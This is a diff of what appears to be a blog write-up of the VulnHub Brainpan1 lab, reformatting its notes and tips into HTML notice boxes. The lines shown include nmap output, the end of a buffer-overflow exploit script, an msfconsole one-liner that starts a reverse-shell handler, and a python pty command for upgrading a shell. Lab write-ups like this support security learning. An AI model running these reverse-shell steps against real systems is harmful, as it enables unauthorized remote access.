@@ -74,7 +74,11 @@ HOP RTT     ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 52.15 seconds
 ```
-> Some of the nmap output was cut out for easier readability
+
+<div class="notice">
+  <h4>Note:</h4>
+  <p>Some of the nmap output was cut out for easier readability</p>
+</div>
 
 Cool! There is a *SimpleHTTPServer* (p:10000) and something what appears like a custom made login application (p:9999).
 
@@ -155,10 +159,12 @@ try:
 except:
 	print "[-] Error connecting - possible crash!!!"
 
-
 {% endhighlight %}
 
-> Note: The IP change to .228 is due to tests being conducted on a new Windows VM
+<div class="notice--info">
+  <h4>Note:</h4>
+  <p>The IP change to .228 is due to tests being conducted on a new Windows VM</p>
+</div>
 
 <img src="/assets/img/blog/vulnhub-brainpan1/brainpan1-05.png">
 
@@ -273,7 +279,11 @@ except:
 If done correctly the reverse shell should arrive to the handler you set up via `msfconsole -q -x "use exploit/multi/handler;set payload windows/shell/reverse_tcp; set LHOST eth0; set LPORT 3333; run"`. 
 
 <img src="/assets/img/blog/vulnhub-brainpan1/brainpan1-08.png">
-> TIP: msfconsole -x can be used to chain many metasploit commands into one!   
+
+<div class="notice--info">
+  <h4>Tip:</h4>
+  <p><b>msfconsole -x</b> can be used to chain many metasploit commands into one! </p>
+</div>
 
 Concept of  BOFs is kind of complicated and describing it within one blogpost is impossible. I highly recommend binary hacking series by [LiveOverflow](https://www.youtube.com/playlist list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN) to begin learning if anything is unclear. 
 
@@ -281,7 +291,10 @@ Now that we have the exploit figured out, replace the windows shellcode with lin
 
 <img src="/assets/img/blog/vulnhub-brainpan1/brainpan1-09.png">
 
-> TIP: `python -c 'import pty; pty.spawn("/bin/sh")'` = A TTY shell for easier console interaction
+<div class="notice--info">
+  <h4>Tip:</h4>
+  <p><b>python -c 'import pty; pty.spawn("/bin/sh")'</b> = A TTY shell for easier console interaction</p>
+</div>
 
 Reverse shell has been achieved ;) !
 
